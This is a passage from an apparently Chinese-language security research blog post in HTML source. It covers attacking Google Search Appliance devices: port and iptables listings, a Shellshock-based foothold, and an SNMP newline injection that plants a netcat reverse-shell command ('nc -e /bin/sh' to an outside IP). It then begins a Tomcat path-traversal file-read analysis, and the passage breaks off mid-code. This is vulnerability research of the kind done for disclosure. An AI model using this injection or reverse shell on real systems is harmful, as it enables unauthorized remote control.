      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9450&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager )&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10094&lt;/td&gt;
      &lt;td&gt;enterprise_onebox&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10200&lt;/td&gt;
      &lt;td&gt;clustering_server&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11913&lt;/td&gt;
      &lt;td&gt;sessionmanager&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12345&lt;/td&gt;
      &lt;td&gt;RegistryServer&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19780&lt;/td&gt;
      &lt;td&gt;configmgr/ent_configmgr.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;21200&lt;/td&gt;
      &lt;td&gt;FileSystemGateway&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;31300&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;未知&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;雖然有這麼多服務，但是 iptables 阻擋了大部分的連線，以下是 iptables 設定：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Redirect privileged ports.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# (we listen as nobody, which can&apos;t attach to low ports, so redirect to high ports)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 7800
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4430
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 444 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4431
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7800 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7801 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4430 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4431 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 19900 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8000 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9941 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9942 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 10999 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 68 &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 67 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 137:138 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 123 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 514 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 162 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;整理出來實際可存取的TCP 攻擊面：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;通訊埠&lt;/th&gt;
      &lt;th&gt;服務名稱&lt;/th&gt;
      &lt;th&gt;程式執行檔所在位置&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;/usr/sbin/sshd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/feedergate&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseAdminConsole.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;/usr/sbin/stunnel&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;而我們發現  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/export/hda3/versionmanager/google_key.symmetric&lt;/code&gt; 中的字串可以用來解密所有 install_bundle 的內容！
使用 CVE-2014-6271 取得權限加上可以解出 install bundle 中的內容後，對 vGSA 的研究就暫時告一段落，
其執行環境中記憶體的保護較為缺少，可能有機會存在弱點並利用：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;gsa&quot;&gt;GSA&lt;/h3&gt;

&lt;p&gt;安裝設備後嘗試更改開機順序，但發現進入BIOS需要密碼，且磁碟介面卡的管理介面中 Dell H700 僅有部分功能可以操作：
&lt;img src=&quot;/assets/img/blog/20230707/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接著嘗試直接讀取硬碟內容，如果硬碟內容沒有加密，有機會能直接取得設備作業系統及軟體。
我們發現其硬碟使用SAS 介面進行傳輸，嘗試前還需購買SAS 卡，本次測試使用LSI 9211-8i 進行連結：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;連接嘗試讀取後發現到這是一個自我加密 SED 磁碟，需要密碼unlock 才能存取，OSSLab 這邊有更詳細的解釋：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.osslab.com.tw/ata-sed-security/&quot;&gt;https://www.osslab.com.tw/ata-sed-security/&lt;/a&gt; (中文)&lt;/p&gt;

&lt;p&gt;在無法直接存取硬碟的情況下有幾種方式可以繼續嘗試：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;嘗試讀出於BIOS EEPROM 中的密碼，並更改開機順序&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;此方式需要破壞主機板，有一定風險，於軟體層找不到漏洞才會使用此種方式。
可參考這篇研究 &lt;a href=&quot;https://blog.cybercx.co.nz/bypassing-bios-password&quot;&gt;https://blog.cybercx.co.nz/bypassing-bios-password&lt;/a&gt; (英文)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;使用 PCILeech 讀取、寫入記憶體並取得系統權限&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;此方式需要特定PCI-e 設備，當時還沒有準備此類設備。可以參考這個 github 專案：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ufrisk/pcileech&quot;&gt;https://github.com/ufrisk/pcileech&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;尋找可存取服務之軟體漏洞&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;此方式較為簡單可行。&lt;/p&gt;

&lt;h4 id=&quot;管理介面換行字元插入&quot;&gt;管理介面換行字元插入&lt;/h4&gt;

&lt;p&gt;登入管理介面後，觀察到其中有 SNMP 取得系統資訊的功能，
且此功能可以插入自定義字串：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這邊嘗試經典的換行注入：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;將 sysContact 插入&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extend shell /bin/nc -e /bin/sh 10.5.2.1 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;插入 extend 設定值之後，就可以用 snmpwalk 觸發 SNMP 的extend 功能，
並執行 shell。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;成功執行指令並反連。&lt;/p&gt;

&lt;h4 id=&quot;任意讀檔&quot;&gt;任意讀檔&lt;/h4&gt;

&lt;p&gt;於 GSA 6.x 系列版本後的 RPM 安裝包中發現其 80/443 的網頁服務使用 Apache httpd，
其中位於 /etc/httpd/conf.d/ 中有許多的設定。
而其中 gsa-http.conf 及 gsa-https.conf 可以發現某些目錄會被導向至本機特定的服務：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  RewriteEngine on
  RewriteRule ^/security-manager/(.*) http://localhost:7886/security-manager/$1 [P,L]
  RewriteRule ^/d██████████/(.*) http://localhost:7890/dps/d██████████/$1 [P,L]
  RewriteRule ^/s██████/(.*) http://localhost:7890/dps/s██████/$1 [P,L]
  RewriteRule ^/v█████/(.*) http://localhost:7890/v█████/$1 [P,L]
  RewriteRule ^/$ http://localhost:7800/ [P,L]
  RewriteRule ^/(.*) http://localhost:7800/$1 [P,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中通訊埠為 7886 跟 7890 的服務為另外執行的 Apache Tomcat 伺服器，當串接兩層以上的網站伺服器時，
Tomcat 的路徑判斷 ..;/ 是一個有趣的測試點，可以參閱一位老前輩的文章：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;而我們有興趣的點為 dps ，這似乎沒有在舊版的 GSA 中看到。
從 dps.war 中解出 /WEB-INF/web.xml 觀察網頁應用配置，並發現 /font 會呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;rootDirectory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;work/fonts/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/font/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接著查看 DPSDownloadServlet：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.documill.dps.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.servlet.ServletContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSDownloadServlet&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DownloadServlet&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSUserService&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DPSDownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRealPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servletcontext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;DPS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getHomeDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FileNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DPSDownloadServlet:getRealPath:DPS home directory not specified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
